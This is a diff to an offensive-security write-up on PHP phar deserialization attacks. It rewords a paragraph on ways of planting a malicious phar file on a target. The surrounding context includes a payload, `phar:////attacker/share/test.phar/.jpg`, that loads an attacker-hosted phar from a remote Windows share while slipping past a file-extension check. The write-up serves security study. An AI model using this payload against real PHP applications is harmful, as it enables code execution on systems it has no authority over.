@@ -184,7 +184,7 @@ include('phar://test.phar');
 
 #### Phar planting
 
-<p class="cn" markdown="1">There are several ways to do this as outlined by Sam such as using a [race condition](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) with `phpinfo` in which you can leak the temporary file that is uploaded or using `/proc/self/fd`. However, the techniques that I tested and proved working (at least in this specific case) are:</p>
+<p class="cn" markdown="1">Sam states that there are several ways to do this such as using a [race condition](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) with `phpinfo` in which you can leak the temporary file that is uploaded or using `/proc/self/fd`. However these techniques don't work because there is a check for a file extension. The techniques that I tested and proved working (at least in this specific case) are:</p>
 
 <div markdown="1" class="cn">
 * If targeting a Windows system, just use a remote share! `phar:////attacker/share/test.phar/.jpg`.
